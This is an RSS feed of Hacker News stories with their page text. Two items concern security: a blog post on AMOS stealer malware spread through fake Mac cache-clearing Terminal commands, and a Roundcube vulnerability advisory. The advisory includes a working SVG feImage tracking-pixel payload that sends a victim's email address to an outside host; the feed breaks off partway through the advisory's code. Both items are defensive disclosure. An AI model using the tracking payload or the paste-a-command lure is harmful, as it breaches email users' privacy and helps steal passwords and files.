<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 09 Feb 2026 03:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[AI makes the easy part easier and the hard part harder (169 pts)]]></title>
            <link>https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder</link>
            <guid>46939593</guid>
            <pubDate>Sun, 08 Feb 2026 23:13:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder">https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder</a>, See on <a href="https://news.ycombinator.com/item?id=46939593">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><header><h2>Writing on software, systems, and hard-won lessons.</h2><p>Writing on developer experience, systems thinking, and the mistakes behind both - covering AI workflows, continuous improvement, and the mental models that drive better decisions.</p></header></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Shifts in U.S. Social Media Use, 2020–2024: Decline, Fragmentation, Polarization (2025) (144 pts)]]></title>
            <link>https://arxiv.org/abs/2510.25417</link>
            <guid>46938903</guid>
            <pubDate>Sun, 08 Feb 2026 21:52:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2510.25417">https://arxiv.org/abs/2510.25417</a>, See on <a href="https://news.ycombinator.com/item?id=46938903">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2510.25417">View PDF</a>
    <a href="https://arxiv.org/html/2510.25417v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Using nationally representative data from the 2020 and 2024 American National Election Studies (ANES), this paper traces how the U.S. social media landscape has shifted across platforms, demographics, and politics. Overall platform use has declined, with the youngest and oldest Americans increasingly abstaining from social media altogether. Facebook, YouTube, and Twitter/X have lost ground, while TikTok and Reddit have grown modestly, reflecting a more fragmented digital public sphere. Platform audiences have aged and become slightly more educated and diverse. Politically, most platforms have moved toward Republican users while remaining, on balance, Democratic-leaning. Twitter/X has experienced the sharpest shift: posting has flipped nearly 50 percentage points from Democrats to Republicans. Across platforms, political posting remains tightly linked to affective polarization, as the most partisan users are also the most active. As casual users disengage and polarized partisans remain vocal, the online public sphere grows smaller, sharper, and more ideologically extreme.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Petter Törnberg [<a href="https://arxiv.org/show-email/4aeaba31/2510.25417" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Wed, 29 Oct 2025 11:37:16 UTC (3,317 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Everything – Locate files and folders by name instantly (112 pts)]]></title>
            <link>https://www.voidtools.com/</link>
            <guid>46938615</guid>
            <pubDate>Sun, 08 Feb 2026 21:19:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.voidtools.com/">https://www.voidtools.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46938615">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<h2 id="everything">Everything</h2>
<p>Locate files and folders by name instantly.</p>

<p><a href="https://www.voidtools.com/support/everything"><img alt="Everything" height="215" src="https://www.voidtools.com/sssmall3.png" width="277"></a>
</p>
<div>
<ul>
<li><p>Small installation file</p></li>
<li><p>Clean and simple user interface</p></li>
<li><p>Quick filename indexing</p></li>
<li><p>Quick searching</p></li>
<li><p>Minimal resource usage</p></li>
<li><p>Real-time updating</p></li>
<li><p><a href="https://www.voidtools.com/faq">More...</a></p></li>
</ul>
</div>

<h2 id="dl">Download Everything 1.4.1.1032</h2><p><a href="https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe">Download Installer</a>
<a href="https://www.voidtools.com/Everything-1.4.1.1032.x64-Setup.exe">Download Installer 64-bit</a></p>
<p><a href="https://www.voidtools.com/Everything-1.4.1.1032.x86.zip">Download Portable Zip</a>
<a href="https://www.voidtools.com/Everything-1.4.1.1032.x64.zip">Download Portable Zip 64-bit</a></p>
<p><a href="https://www.voidtools.com/Everything-1.4.1.1032.x86.Lite-Setup.exe">Download Lite Installer</a>
<a href="https://www.voidtools.com/Everything-1.4.1.1032.x64.Lite-Setup.exe">Download Lite Installer 64-bit</a></p>
<p><a href="https://www.voidtools.com/Changes.txt">Changes</a><span></span><a href="https://www.voidtools.com/support/everything/whats_new">What's New</a><span></span><a href="https://www.voidtools.com/support/everything/previous_versions">Older Versions</a><span></span><a href="https://www.voidtools.com/License.txt">License</a><span></span><a href="https://www.voidtools.com/Everything-1.4.1.1032.sha256">SHA256</a><span></span><a href="https://www.voidtools.com/support/everything/supported_languages">Supported Languages</a><span></span><a href="https://www.voidtools.com/everything-1.5a">In Development</a><span></span><a href="https://www.voidtools.com/support/everything/installing_everything">Help</a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[More Mac malware from Google search (108 pts)]]></title>
            <link>https://eclecticlight.co/2026/01/30/more-malware-from-google-search/</link>
            <guid>46938398</guid>
            <pubDate>Sun, 08 Feb 2026 20:52:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://eclecticlight.co/2026/01/30/more-malware-from-google-search/">https://eclecticlight.co/2026/01/30/more-malware-from-google-search/</a>, See on <a href="https://news.ycombinator.com/item?id=46938398">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-first_letter="L">
		<p>Little more than a month after I reported that Google’s AI was <a href="https://eclecticlight.co/2025/12/11/how-online-search-and-ai-can-install-malware/">offering links to malicious scripts</a>, that is happening again, with a slight twist. I’m grateful to Olena of Clario for informing me that there’s a new campaign in progress to deliver AMOS (alias SOMA) stealers to Macs. You can read Vladyslav Kolchin’s account of this in <a href="https://mackeeper.com/blog/suspicious-ads-on-google-which-contain-harmful-content-for-mac-users/" target="_blank" rel="noopener">his blog post</a>.</p>
<p>Vladyslav has discovered these in forged Apple-like sites linked from docs.google.com and business.google.com, as well as in articles posted on Medium. I had success in finding the last of those, which appeared at the top of Google’s sponsored results when searching for <code>how to clear cache on macos tahoe</code>.</p>
<p><span><a href="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg"><img data-attachment-id="90431" data-permalink="https://eclecticlight.co/2026/01/30/more-malware-from-google-search/mediummw1/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg" data-orig-size="1361,963" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="mediummw1" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=300" data-large-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=940" src="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg" alt="" width="940" height="665" srcset="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=940&amp;h=665 940w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=150&amp;h=106 150w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=300&amp;h=212 300w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=768&amp;h=543 768w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg?w=1024&amp;h=725 1024w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw1.jpg 1361w" sizes="(max-width: 940px) 100vw, 940px"></a></span></p>
<p>That took me to Clear Mareks’ stories in medium.com, where there’s the familiar ploy to get us to paste a malicious command into Terminal. On another occasion, you might be presented with a page claiming to be official Apple Support, although it obviously isn’t.</p>
<p><span><a href="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg"><img data-attachment-id="90432" data-permalink="https://eclecticlight.co/2026/01/30/more-malware-from-google-search/mediummw2/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg" data-orig-size="974,1126" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="mediummw2" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=260" data-large-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=886" src="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg" alt="" width="940" height="1087" srcset="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=940&amp;h=1087 940w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=130&amp;h=150 130w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=260&amp;h=300 260w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg?w=768&amp;h=888 768w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw2.jpg 974w" sizes="(max-width: 940px) 100vw, 940px"></a></span></p>
<p>This is almost identical to the previous attack via ChatGPT, and even the base-64 obfuscation is very similar.</p>
<p><span><a href="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg"><img data-attachment-id="90433" data-permalink="https://eclecticlight.co/2026/01/30/more-malware-from-google-search/mediummw3/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg" data-orig-size="1883,1215" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="mediummw3" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=300" data-large-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=940" loading="lazy" src="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg" alt="" width="940" height="607" srcset="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=940&amp;h=607 940w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=1880&amp;h=1213 1880w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=150&amp;h=97 150w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=300&amp;h=194 300w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=768&amp;h=496 768w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=1024&amp;h=661 1024w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw3.jpg?w=1440&amp;h=929 1440w" sizes="(max-width: 940px) 100vw, 940px"></a></span></p>
<p>This downloaded and ran an AMOS stealer, which unusually didn’t seem too bothered about being run in a locked-down virtual machine.</p>
<p><span><a href="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg"><img data-attachment-id="90434" data-permalink="https://eclecticlight.co/2026/01/30/more-malware-from-google-search/mediummw4/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg" data-orig-size="1433,1007" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="mediummw4" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=300" data-large-file="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=940" loading="lazy" src="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg" alt="" width="940" height="661" srcset="https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=940&amp;h=661 940w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=150&amp;h=105 150w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=300&amp;h=211 300w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=768&amp;h=540 768w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg?w=1024&amp;h=720 1024w, https://eclecticlight.co/wp-content/uploads/2026/01/mediummw4.jpg 1433w" sizes="(max-width: 940px) 100vw, 940px"></a></span></p>
<p>It immediately started copying the contents of my Documents folder to “FileGrabber”, and wrote several hidden files to the top level of my Home folder, including:</p>
<ul>
<li>.agent, an AppleScript to run the theft</li>
<li>.mainHelper, the main Mach-O binary</li>
<li>.pass, my password in plain text.</li>
</ul>
<p>Those appear the same as the version of AMOS delivered using last year’s ChatGPT deception. In addition to seeking access to the Documents folder, the malware asked for access to Notes.</p>
<p><span><a href="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg"><img data-attachment-id="89734" data-permalink="https://eclecticlight.co/2025/12/11/how-online-search-and-ai-can-install-malware/aitrap7/" data-orig-file="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg" data-orig-size="929,731" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="aitrap7" data-image-description="" data-image-caption="" data-medium-file="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg?w=300" data-large-file="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg?w=929" loading="lazy" src="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg" alt="" width="929" height="731" srcset="https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg 929w, https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg?w=150&amp;h=118 150w, https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg?w=300&amp;h=236 300w, https://eclecticlight.co/wp-content/uploads/2025/12/aitrap7.jpg?w=768&amp;h=604 768w" sizes="(max-width: 929px) 100vw, 929px"></a></span></p>
<p>The messages are the same. First, distrust everything you see in search engines. Assess what they return critically, particularly anything that’s promoted. It’s promoted for a reason, and that’s money, so before you click on any link ask how that’s trying to make money from you.</p>
<p>Next, check the provenance and authenticity of where that click takes you. In this case, it was to a Medium article that had been poisoned to trick you. When you’re looking for advice, look for a URL that’s part of a site you recognise as a reputable Mac specialist. Never follow a shortened link without expanding it using a utility like <strong>Link Unshortener</strong> from the App Store, rather than one of the potentially malicious sites that claims to perform that service.</p>
<p>When you think you’ve found a solution, don’t follow it blindly, be critical. Never run any command in Terminal unless it comes from a reputable source that explains it fully, and you have satisfied yourself that you understand exactly what it does. In this case the command provided was obfuscated to hide its true action, and should have rung alarm bells as soon as you saw it.</p>
<p>If you were to spare a few moments to read what it contains, you would have seen the command <code>curl</code>, which is commonly used by malware to fetch their payloads without any quarantine xattr being attached to them. Even though the rest of the script had been concealed by base-64 encoding, that shouts out that this is malicious.</p>
<p>Why can’t macOS protect you from this? Because at each step you have been tricked into bypassing its protections. Terminal isn’t intended to be a place for the innocent to paste obfuscated commands inviting you to surrender your password and download executable code to exploit your Mac. <code>curl</code> isn’t intended to allow malware to arrive without being put into quarantine. And ad hoc signatures aren’t intended to allow that malicious code to be executed.</p>
<p>Maybe it’s appropriate that Marek’s disease is chicken herpes.</p>
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A GTA modder has got the 1997 original working on modern PCs and Steam Deck (140 pts)]]></title>
            <link>https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/</link>
            <guid>46938241</guid>
            <pubDate>Sun, 08 Feb 2026 20:34:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/">https://gtaforums.com/topic/986492-grand-theft-auto-ready2play-full-game-windows-version/</a>, See on <a href="https://news.ycombinator.com/item?id=46938241">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-role="commentContent" data-controller="core.front.core.lightboxedImages">
			<p>
	Nice one, right, beauty! What a way to celebrate the 25th anniversary of GTA, even though I am a day late to the celebration, having all three games remastered on such a day is nothing short of respect. This version may even rival the MAX PACK by Toshiba-3. I have not played all the way through this version of the 2D trilogy, but it all looked good to me from the outside and among the few things I messed around with in-game. I love the CRT filter you added and combined with the aspect ratio option makes for a nostalgic joyride, I am not sure what to think about the other filters. Bilinear, scanline, fast-sharpen, and xbr-lv2-noblend are the only ones I noticed any real differences on. Albeit small, they made a difference in comparison to the other filters on this list where I saw little to no effect at all, although that could just be my laptop acting funny. Something I noticed about London 1969 and 1961 is that both have scores from previous games, I think you may have forgotten to fix that, but it is not really a big deal breaker. There are some suggestions I would like to add to improve the experience, I'll leave the glitch hunting to others or when I eventually get back into the spirit of the game.
</p>



<p>
	<strong>Quick edit:</strong> There's only two languages at the moment, hope to see support for other languages in an update. Also, what does the German flag icon at the upper right do?
</p>

<div>
	
	<p><strong>HUD needs an update: </strong>Don't get me wrong, I like the HUD, it gives off a typical 90's or 2000's vibes just from the way it looks alone. But the background picture looks rushed and somewhat bland along with the very few options you are allowed to choose from. I think the HUD could use a small update for both the options and the picture itself, along with an option to play the game separately with their own unique menus and backgrounds to match the game you choose. Also, for some reason, there's two descriptions missing for the "Vsync" and "Aspect ratio" option when I tried to hover my mouse over them. One option that definitely needs to be included is the "Controls" menu, I know you could just look inside the folders and change the controls from there but a quick click on the HUD instead navigating the folders would be nice. I guess you could also include having the 2D GTA maps as an option, but I'm sure most people know how to do a quick search and find them on Bing or Google so this is not really a priority, although it would be nice.</p><p>
	
	<strong>3DFX &amp; Low Color Mode:&nbsp;</strong>This one may be a stretch and probably impossible to include seeing as this is running on the Windows version of 2D GTA games, but it would be nice to play with these options. I know there is not really any real reason to play with these versions and I do not have a good argument to justify their inclusion should they be implemented aside from low color's different graphics and possibly better framerate. I guess that's more up to you as I feel this package is overall solid.
</p></div>

<p>
	<br>
	That is all I could really offer as suggestions and from what I have noticed outside the games. I do not want to come off as ungrateful or as whiny for this port, I am not, thanks to your contribution the game runs better and plays better. Not to mention, the multiplayer is much more accessible and less of a headache to set up than the MAX PACK version which required a few you to do some outside programming to even do. So again, you have my and the thanks of everyone in the GTA community.
</p>


			
				

<p><span data-excludequote="">
	<strong>Edited <time datetime="2022-10-22T20:51:08Z" title="10/22/2022 08:51  PM" data-short="3 yr">October 22, 2022</time> by ThermalSmoke</strong>
	
		<br>Grammar Correction &amp; Tweaks
	
	
</span>
			
		</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Roundcube Webmail: SVG feImage bypasses image blocking to track email opens (108 pts)]]></title>
            <link>https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/</link>
            <guid>46937012</guid>
            <pubDate>Sun, 08 Feb 2026 18:24:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/">https://nullcathedral.com/posts/2026-02-08-roundcube-svg-feimage-remote-image-bypass/</a>, See on <a href="https://news.ycombinator.com/item?id=46937012">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Roundcube's HTML sanitizer doesn't treat SVG feImage href as an image source. Attackers can bypass remote image blocking to track email opens.</p></div><div itemprop="articleBody"><p><strong>TL;DR:</strong> Roundcube’s <code>rcube_washtml</code> sanitizer blocked external resources on <code>&lt;img&gt;</code>, <code>&lt;image&gt;</code>, and <code>&lt;use&gt;</code>, but not on <code>&lt;feImage&gt;</code>. Its <code>href</code> went through the wrong code path and got allowed through. Attackers could track email opens even when “Block remote images” was on. Fixed in 1.5.13 and 1.6.13.</p><h2 id="vulnerability-information">Vulnerability information<a href="#vulnerability-information" aria-label="Link to this section"></a></h2><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td><strong>Vendor</strong></td><td>Roundcube</td></tr><tr><td><strong>Product</strong></td><td>Roundcube Webmail</td></tr><tr><td><strong>Affected versions</strong></td><td>&lt; 1.5.13, 1.6.x &lt; 1.6.13</td></tr><tr><td><strong>Fixed in</strong></td><td>1.5.13, 1.6.13</td></tr><tr><td><strong>Disclosure date</strong></td><td>2026-02-08</td></tr></tbody></table><h2 id="background">Background<a href="#background" aria-label="Link to this section"></a></h2><p>When <code>allow_remote</code> is false, Roundcube’s sanitizer intercepts image-bearing attributes (<code>src</code> on <code>&lt;img&gt;</code>, <code>href</code> on <code>&lt;image&gt;</code> and <code>&lt;use&gt;</code>) and runs them through <code>is_image_attribute()</code>. That function blocks external URLs.</p><p>Separately, non-image URLs (like <code>&lt;a href&gt;</code>) go through <code>wash_link()</code>, which lets HTTP/HTTPS URLs through. That’s fine for links the user clicks on intentionally.</p><h2 id="discovery">Discovery<a href="#discovery" aria-label="Link to this section"></a></h2><p>I got bored during my christmas vacation and <a href="https://roundcube.net/news/2025/12/13/security-updates-1.6.12-and-1.5.12">this SVG-based XSS fix via the <code>animate</code> tag</a> appeared on my radar. One SVG bug usually means more.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> So I spent some time going through <code>rcube_washtml.php</code>, looking at which SVG elements made it onto the allowlist and how their attributes get handled and sanitized.</p><p><code>&lt;feImage&gt;</code> stood out.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> Its <code>href</code> gets fetched on render, same as <code>&lt;img src&gt;</code>. But the sanitizer sends it through <code>wash_link()</code> instead of <code>is_image_attribute()</code>.</p><p>So the “Block remote images” setting doesn’t apply to it.</p><h2 id="technical-details">Technical details<a href="#technical-details" aria-label="Link to this section"></a></h2><p>In <code>wash_attribs()</code>, every attribute hits a chain of checks. The first one that matches wins:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L310-L313">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>if</span> <span>(</span><span>$this</span><span>-&gt;</span><span>is_image_attribute</span><span>(</span><span>$node</span><span>-&gt;</span><span>nodeName</span><span>,</span> <span>$key</span><span>))</span> <span>{</span>
</span></span><span><span>    <span>$out</span> <span>=</span> <span>$this</span><span>-&gt;</span><span>wash_uri</span><span>(</span><span>$value</span><span>,</span> <span>true</span><span>);</span>  <span>// blocks remote URLs
</span></span></span><span><span><span>}</span> <span>elseif</span> <span>(</span><span>$this</span><span>-&gt;</span><span>is_link_attribute</span><span>(</span><span>$node</span><span>-&gt;</span><span>nodeName</span><span>,</span> <span>$key</span><span>))</span> <span>{</span>
</span></span><span><span>    <span>$out</span> <span>=</span> <span>$this</span><span>-&gt;</span><span>wash_link</span><span>(</span><span>$value</span><span>);</span>        <span>// allows http/https
</span></span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Before the fix, <code>is_image_attribute()</code> looked like this:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L472-L481">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>private</span> <span>function</span> <span>is_image_attribute</span><span>(</span><span>$tag</span><span>,</span> <span>$attr</span><span>)</span>
</span></span><span><span><span>{</span>
</span></span><span><span>    <span>return</span> <span>$attr</span> <span>==</span> <span>'background'</span>
</span></span><span><span>        <span>||</span> <span>$attr</span> <span>==</span> <span>'color-profile'</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>'poster'</span> <span>&amp;&amp;</span> <span>$tag</span> <span>==</span> <span>'video'</span><span>)</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>'src'</span> <span>&amp;&amp;</span> <span>preg_match</span><span>(</span><span>'/^(img|image|source|input|video|audio)$/i'</span><span>,</span> <span>$tag</span><span>))</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$tag</span> <span>==</span> <span>'use'</span> <span>&amp;&amp;</span> <span>$attr</span> <span>==</span> <span>'href'</span><span>)</span>
</span></span><span><span>        <span>||</span> <span>(</span><span>$tag</span> <span>==</span> <span>'image'</span> <span>&amp;&amp;</span> <span>$attr</span> <span>==</span> <span>'href'</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>The <code>href</code> attribute is only matched for <code>use</code> and <code>image</code>. No <code>feimage</code>.</p><p>And <code>is_link_attribute()</code> is a catch-all<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/4c378113ce1682022c53e8f75ac754a83fe5b43b/program/lib/Roundcube/rcube_washtml.php#L459-L462">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>private</span> <span>function</span> <span>is_link_attribute</span><span>(</span><span>$tag</span><span>,</span> <span>$attr</span><span>)</span>
</span></span><span><span><span>{</span>
</span></span><span><span>    <span>return</span> <span>$attr</span> <span>===</span> <span>'href'</span><span>;</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>So when the sanitizer encounters <code>&lt;feImage href="https://..."&gt;</code>: <code>is_image_attribute('feimage', 'href')</code> returns false, <code>is_link_attribute('feimage', 'href')</code> returns true, and the URL goes through <code>wash_link()</code> which passes HTTP/HTTPS URLs straight through.</p><h2 id="proof-of-concept">Proof of concept<a href="#proof-of-concept" aria-label="Link to this section"></a></h2><p>An invisible 1x1 SVG, positioned off-screen:</p><div><pre tabindex="0"><code data-lang="html"><span><span><span>&lt;</span><span>svg</span> <span>width</span><span>=</span><span>"1"</span> <span>height</span><span>=</span><span>"1"</span> <span>style</span><span>=</span><span>"position:absolute;left:-9999px;"</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;</span><span>defs</span><span>&gt;</span>
</span></span><span><span>    <span>&lt;</span><span>filter</span> <span>id</span><span>=</span><span>"t"</span><span>&gt;</span>
</span></span><span><span>      <span>&lt;</span><span>feImage</span> <span>href</span><span>=</span><span>"https://httpbin.org/image/svg?email=victim@test.com"</span>
</span></span><span><span>               <span>width</span><span>=</span><span>"1"</span> <span>height</span><span>=</span><span>"1"</span><span>/&gt;</span>
</span></span><span><span>    <span>&lt;/</span><span>filter</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;/</span><span>defs</span><span>&gt;</span>
</span></span><span><span>  <span>&lt;</span><span>rect</span> <span>filter</span><span>=</span><span>"url(#t)"</span> <span>width</span><span>=</span><span>"1"</span> <span>height</span><span>=</span><span>"1"</span><span>/&gt;</span>
</span></span><span><span><span>&lt;/</span><span>svg</span><span>&gt;</span>
</span></span></code></pre></div><p>The browser evaluates the SVG filter and fires a GET to the attacker’s URL.</p><h2 id="impact">Impact<a href="#impact" aria-label="Link to this section"></a></h2><p>The “Block remote images” setting doesn’t block this remote image. An attacker can confirm you opened it, log your IP, and fingerprint your browser.</p><p>The fix (<a href="https://github.com/roundcube/roundcubemail/commit/26d7677"><code>26d7677</code></a>) collapses the two separate <code>use</code>/<code>image</code> checks into a single regex that includes <code>feimage</code>:</p><p><a href="https://github.com/roundcube/roundcubemail/blob/26d7677471b68ff2d02ebe697cb606790b0cf52f/program/lib/Roundcube/rcube_washtml.php#L478">rcube_washtml.php</a></p><div><pre tabindex="0"><code data-lang="php"><span><span><span>||</span> <span>(</span><span>$attr</span> <span>==</span> <span>'href'</span> <span>&amp;&amp;</span> <span>preg_match</span><span>(</span><span>'/^(feimage|image|use)$/i'</span><span>,</span> <span>$tag</span><span>));</span> <span>// SVG
